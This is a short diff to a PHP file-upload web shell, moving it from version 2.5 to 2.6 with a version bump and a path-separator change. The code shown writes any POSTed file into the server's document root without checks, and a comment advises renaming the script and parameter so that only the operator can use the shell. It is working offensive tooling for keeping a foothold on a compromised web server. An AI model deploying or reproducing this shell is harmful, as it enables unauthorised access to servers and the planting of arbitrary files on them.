@@ -1,6 +1,6 @@
 <?php
 // Copyright (c) 2021 Ivan Šincek
-// v2.5
+// v2.6
 // Requires PHP v4.0.3 or greater because move_uploaded_file() is used.
 
 // modify the script name and request parameter name to random ones to prevent others form accessing and using your web shell
@@ -10,7 +10,7 @@
 $parameter = 'file';
 $output = null;
 if (isset($_SERVER['REQUEST_METHOD']) && strtolower($_SERVER['REQUEST_METHOD']) === 'post' && isset($_FILES[$parameter]['name']) && ($_FILES[$parameter]['name'] = trim($_FILES[$parameter]['name'])) && strlen($_FILES[$parameter]['name']) > 0) {
-    $output = $_SERVER['DOCUMENT_ROOT'] . '/' . $_FILES[$parameter]['name'];
+    $output = $_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . $_FILES[$parameter]['name'];
     if (@move_uploaded_file($_FILES[$parameter]['tmp_name'], $output) === false) {
         $output = 'ERROR: Cannot upload file.';
     } else {
